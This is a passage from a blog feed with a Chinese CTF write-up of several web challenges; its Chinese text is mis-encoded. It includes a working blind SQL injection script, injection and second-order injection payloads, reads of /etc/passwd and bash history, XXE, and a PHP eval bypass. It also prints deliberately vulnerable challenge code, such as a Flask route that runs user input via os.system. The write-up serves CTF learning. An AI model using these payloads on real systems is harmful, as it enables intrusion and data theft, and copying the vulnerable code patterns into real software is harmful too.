 &lt;/plugins&gt;  &lt;/build&gt;</code></pre><h2 id="mavené…ç½®æ–‡ä»¶"><a href="#mavené…ç½®æ–‡ä»¶" class="headerlink" title="mavené…ç½®æ–‡ä»¶"></a>mavené…ç½®æ–‡ä»¶</h2><h3 id="æ·»åŠ é•œåƒä»“åº“"><a href="#æ·»åŠ é•œåƒä»“åº“" class="headerlink" title="æ·»åŠ é•œåƒä»“åº“"></a>æ·»åŠ é•œåƒä»“åº“</h3><p>åœ¨mirrorsä¸‹æ·»åŠ </p><pre><code class="xml">&lt;mirror&gt;        &lt;id&gt;alimaven&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;!-- å“ªä¸ªä»“åº“çš„é•œåƒï¼Œåˆ©ç”¨*æ¥åŒ¹é…æ‰€æœ‰ä»“åº“ --&gt;        &lt;name&gt;aliyun maven&lt;/name&gt;        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;jcenter&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;jcenter.bintray.com&lt;/name&gt;        &lt;url&gt;http://jcenter.bintray.com/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;repo1&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;        &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;repo2&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;        &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;    &lt;/mirror&gt;</code></pre><h3 id="ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€"><a href="#ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€" class="headerlink" title="ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€"></a>ä¿®æ”¹æœ¬åœ°ä»“åº“åœ°å€</h3><p>ä¿®æ”¹<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p><h2 id="å¸¸ç”¨æ’ä»¶ä»‹ç»"><a href="#å¸¸ç”¨æ’ä»¶ä»‹ç»" class="headerlink" title="å¸¸ç”¨æ’ä»¶ä»‹ç»"></a>å¸¸ç”¨æ’ä»¶ä»‹ç»</h2><p> jetty : servlet æœ¬åœ°æµ‹è¯•æ’ä»¶</p><p> <a href="http://tomcat.apache.org/maven-plugin.html" target="_blank" rel="noopener">tomcat</a>  :  tomcat  æœ¬åœ°æµ‹è¯•æ’ä»¶</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/05/mavenå­¦ä¹ ç¬”è®°/">http://blog.ccreater.top/2020/05/05/mavenå­¦ä¹ ç¬”è®°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4æœˆåšé¢˜</title>
      <link href="/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/"/>
      <url>/2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="4æœˆåšé¢˜"><a href="#4æœˆåšé¢˜" class="headerlink" title="4æœˆåšé¢˜"></a>4æœˆåšé¢˜</h1><h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>åˆšå¼€å§‹çœ‹è¿™ä¸ªéå¸¸æ€•â€¦åæ¥è°·æ­Œäº†ä¸€ä¸‹ctfdçš„cveç›´æ¥æ‰“ç©¿,è¿™é¢˜å°±æ˜¯å¼Ÿå¼Ÿ</p><p> <a href="https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0</a> </p><p>ç™»é™†åå°åæŠŠæ•°æ®å¯¼å‡ºå°±æ‹¿åˆ°flagäº†</p><p><code>flag{1b236e8e-8f64-461d-a973-7059e706aeec}</code></p><h2 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h2><p>æœ‰ä¸¤å¤„æ³¨å…¥ç‚¹</p><p>ç¬¬ä¸€å¤„:</p><p><code>/search.php?id=1</code></p><p>é»‘åå•:<code>hex,if, ,and</code></p><p>payload:<code>/search.php?id=1/(((select(ord(substr(group_concat(table_name),20,1)))from(information_schema.tables)where(table_schema=database()))-31)&gt;0)</code></p><p>ç›²æ³¨è„šæœ¬:</p><pre><code class="python">import requestsimport time#ä¿®æ”¹biggerå’Œsqlinjå°±å¥½#å®ç°biggeræ‰èƒ½ä½¿ç”¨def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#å¾…æ±‚æ•°æ®å¤§äºnumdef bigger(num):    return sqlinj(num)def less(num):    passdef equal(num):    passdef sqlinj(num):    burp0_url = &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,&#39;,&#39;,password),POS,1)))from(F1naI1y))-GUESS)&gt;0)&quot;.replace(&quot;GUESS&quot;,str(num)).replace(&quot;POS&quot;,str(pos))    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers)    time.sleep(0.5)    print(&quot;test &quot;,num)    if &quot;NO! Not this! Click others~~~&quot; in res.text:        return True    else:        return Falseresult=&quot;mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><p>æ•°æ®åº“:information_schema,test,performance_schema,mysql,geek</p><pre><code>F1naI1y,FlaaaaagFlaaaaag:id,fl4gawsF1naI1y:id,username,passwordmygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,Syc,welcom_to_Syclover,finally,cl4y_really_need_a_grilfriend,flag,flag{2e7c980e-7fff-443b-8d1a-1371eaa326ba}</code></pre><p>æµ‹è¯•åç¬¬äºŒæ¬¡å‘ç°ä¸å¦‚ç¬¬ä¸€å¤„å¥½ç”¨,å°±ä¸å†™äº†</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><pre><code class="python">from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#39;/flag&#39;)# def flag():#     return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;/shell&#39;)def shell():    os.system(&quot;rm -f flag.txt&quot;)    exec_cmd = request.args.get(&#39;c&#39;)    os.system(exec_cmd)    return &quot;1&quot;@app.route(&#39;/&#39;)def source():    return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;)</code></pre><p>å»fdæ‰¾flag</p><p><code>flag{7410ef7f-b10e-4da4-9beb-29f304fec028}</code></p><p>so easy</p><h2 id="blanklist"><a href="#blanklist" class="headerlink" title="blanklist"></a>blanklist</h2><p>å †å æ³¨å…¥,handleä»£æ›¿select</p><p><code>flag{dad3eb12-8877-4ea8-8bfe-98ac99a93715}</code></p><h2 id="æ¯ç‡¥çš„æŠ½å¥–"><a href="#æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="æ¯ç‡¥çš„æŠ½å¥–"></a>æ¯ç‡¥çš„æŠ½å¥–</h2><pre><code class="php">&lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;])){$_SESSION[&#39;seed&#39;]=rand(0,999999999);}mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       }$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;])){    if($_POST[&#39;num&#39;]===$str){x        echo &quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&quot;;    }    else{        echo &quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;;    }}show_source(&quot;check.php&quot;);</code></pre><p>ç”¨php_mt_randæ¥çˆ†ç ´</p><p><code>flag{1c171630-aee4-400c-b629-a9e457cbe15e}</code></p><p>ä¸€å®šè¦å»<code>https://www.openwall.com/php_mt_seed/</code>ä¸‹è½½,ä¸è¦å»githubçš„é•œåƒä¸‹è½½,æŠŠæˆ‘å‘æ­»äº†</p><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){    header(&quot;Location: ./login.php&quot;);    die();}if(isset($_GET[&#39;do&#39;])){switch ($_GET[&#39;do&#39;]){case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;#category=result&#39; ,bo_id=&#39;1\    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0){    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;#insert into comment set category = &#39;result&#39; bo_id=&#39;1\&#39;,content=&#39;&#39;,bo_id=&#39;xxx&#39;;    $result = mysql_query($sql);    }    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);}}else{    header(&quot;Location: ./index.php&quot;);}?&gt;</code></pre><p>éœ€è¦ç™»é™†æ‰èƒ½ç•™è¨€</p><p>çˆ†ç ´å¯çŸ¥: zhangwei / zhangwei666 (æˆ‘åäº†çˆ†ç ´åŠå¤©æ²¡å‡ºæ¥è¿˜æ˜¯è°·æ­Œçš„,è°çŸ¥é“åé¢æ˜¯å…¨æ•°å­—)</p><p>ä»£ç å®¡è®¡å‘ç°ç»å…¸çš„äºŒæ¬¡æ³¨å…¥å•Š</p><p>å› ä¸ºæ²¡æœ‰æŠ¥é”™æ‰€ä»¥ä¸çŸ¥é“è‡ªå·±çš„è¯­å¥æ˜¯å¦æ­£ç¡®å°±è°ƒäº†å¾ˆä¹…</p><p>ä»¤<code>catagory=&#39;\\&#39;</code>,</p><pre><code>content=%2Ccontent%3D0x6464646464%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23content=%2Ccontent%3D(SELECT+group_concat(schema_name)+FROM+information_schema.schemata)%2Cbo_id%3D1%2F*&amp;bo_id=1*/%23</code></pre><p>å»æŠŠæ•°æ®åº“dumpä¸‹æ¥åå‘ç°æ²¡å•¥ä¸œè¥¿</p><p>æ¥ç€å»è¯•è¯•è¯»å–æ–‡ä»¶</p><p>å‘ç°å¯ä»¥è¯»å–æ–‡ä»¶</p><p>è¯»å–/etc/passwdå¾—åˆ°</p><pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/falsewww:x:500:500:www:/home/www:/bin/bash</code></pre><p>å‘ç°åªæœ‰ä¸€ä¸ªå¯ä»¥ç™»é™†çš„ç”¨æˆ·:<code>www</code></p><p>æŸ¥çœ‹ä»–çš„<code>.bash_history</code></p><pre><code class="shell">cd /tmp/unzip html.ziprm -f html.zipcp -r html /var/www/cd /var/www/html/rm -f .DS_Storeservice apache2 start</code></pre><p>å‘ç°ä»–è¦åˆ é™¤<code>.DS_Store</code>é˜²æ­¢æˆ‘ä»¬çŸ¥é“ç›®å½•ç»“æ„,ä½†æ˜¯<code>/tmp</code>ç›®å½•æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„,ä¹Ÿå°±æ˜¯æ‰€<code>/tmp/www</code>ä¸‹æœ‰<code>.DS_Store</code>æ–‡ä»¶,æ‹¿åˆ°æ–‡ä»¶è§£æåå¾—åˆ°flagæ–‡ä»¶å</p><pre><code>bootstrapcomment.phpcssflag_8946e1ff1ee3e40f.phpfontsindex.phpjslogin.phpmysql.phpvendorwrite_do.php</code></pre><h2 id="fakexml"><a href="#fakexml" class="headerlink" title="fakexml"></a>fakexml</h2><p>å­˜åœ¨xxe</p><pre><code class="php">&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#39;admin&#39;; //$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    }else{        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    }    }catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>ç›´æ¥è¯»å–/flagå¾—åˆ°flag:<code>flag{663e8e72-be03-4533-a4cd-c44452942287}</code></p><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;])){            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40){                                        die(&quot;This is too Long.&quot;);                                                }                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){                                        die(&quot;NO.&quot;);                                                }                    @eval($code);}else{            highlight_file(__FILE__);}// ?&gt;</code></pre><p>ä»£ç å¾ˆç®€å•,ä½†æ˜¯é™åˆ¶æœ‰ç‚¹éº»çƒ¦,æˆ‘ä»¬åˆ©ç”¨<code>~</code>æ¥ç»•è¿‡ä¸å…è®¸å­—æ¯å’Œæ•°å­—çš„é™åˆ¶</p><blockquote><p> å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢« <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/functions.variable-functions.html">å¯å˜å‡½æ•°</a> è°ƒç”¨ã€‚ </p></blockquote><p>æ‰€ä»¥ä¸èƒ½ç›´æ¥<code>(~&quot;evalçš„~&quot;)(&quot;xxxxx&quot;)</code>,éƒ½æ²¡æ€»ç»“è¿™äº›å‘½ä»¤,å¯¼è‡´æˆ‘è¿‡äº†å¾ˆä¹…æ‰æƒ³èµ·assert</p><p>disable_function:</p><pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>è¦è¯»å–flagå¿…é¡»å‘½ä»¤æ‰§è¡Œ,ä½†æ˜¯æ ¹æ®phpinfo,ä»–ç¦ç”¨äº†system,execç­‰ç­‰ç”¨<code>https://github.com/mm0r1</code>è¿™ä¸ªå¤§ä½¬çš„è„šæœ¬æ¥ç»•è¿‡</p><p><code>flag{c7e5be35-729b-4bd0-aacd-c7a1eb98ddea}</code></p><h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><p>å…è®¸çš„å­—ç¬¦:<code>,:,a-z,{,}</code></p><p>é»‘åå•:<code>pwd,echo</code></p><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯å‡çš„å‘½ä»¤æ‰§è¡Œ,çœ‹åˆ°æŠ¥é”™åå‘ç°è¿™æ˜¯çœŸçš„</p><pre><code class="php">Warning&lt;/b&gt;:  system() expects parameter 1 to be string, array given in &lt;b&gt;/var/www/html/index.php</code></pre><p>é‚£å…ˆæƒ³åŠæ³•è¯»å–index.php,æµ‹è¯•åå‘ç°æ˜¯ç”¨<code>$_REQUEST</code>æ¥æ¥å—æ•°æ®</p><p>åæ¥å®åœ¨æ²¡æƒ³æ³•å°±å»ç™¾åº¦äº†,çœ‹åˆ°çš„wpéƒ½æ˜¯æ¸…ä¸€è‰²çš„ç›´æ¥ç»™æºç ?????æ‚¨ä»¬æºç å“ªæ¥çš„</p><pre><code class="php">&lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {  $json = $_REQUEST[&#39;cmd&#39;];  if (!is_string($json)) {    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;  } elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;  } else {    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;    $cmd = json_decode($json, true)[&#39;cmd&#39;];    if ($cmd !== NULL) {      system($cmd);    } else {      echo &#39;Invalid input&#39;;    }    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;  }}?&gt;</code></pre><p>ç”¨æ¢è¡Œæ¥ç»•è¿‡preg_matchæˆ–è€…è¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦æ¥ç»•è¿‡pregçš„å›æº¯æ¬¡æ•°</p><h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;index&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2&gt;2077å‘å”®äº†,ä¸æ¥ä»½å®ä½“å…¸è—ç‰ˆå—?&lt;/h2&gt;        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;h3&gt;æäº¤è®¢å•&lt;/h3&gt;                &lt;form role=&quot;form&quot; action=&quot;./confirm.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-urlencoded&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;å§“å:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;h3&gt;åœ°å€:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;                    &lt;/p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;æˆ‘æ­£æ˜¯é€é’±ä¹‹äºº&lt;/button&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--?file=?--&gt;</code></pre><p>search.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);#æ—¥ç©¿    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;å§“å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;æœç´¢&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;è®¢å•æŸ¥è¯¢&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;å§“å:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;æŸ¥è¯¢è®¢å•&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;            &lt;/a&gt;            &lt;a 